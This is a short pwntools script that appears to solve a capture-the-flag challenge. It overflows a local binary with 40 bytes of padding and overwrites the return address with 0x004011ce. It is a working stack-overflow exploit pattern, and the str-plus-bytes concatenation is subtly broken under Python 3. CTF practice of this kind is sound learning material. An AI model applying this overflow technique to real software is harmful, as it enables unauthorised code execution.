from pwn import *

elf = context.binary = ELF("./pwn-intended-0x3", checksec=False)
io = elf.process()

print(io.recvline())

offset = 40

payload = "A"*offset + p64(0x004011ce)

io.sendline(payload)

print(io.recv())
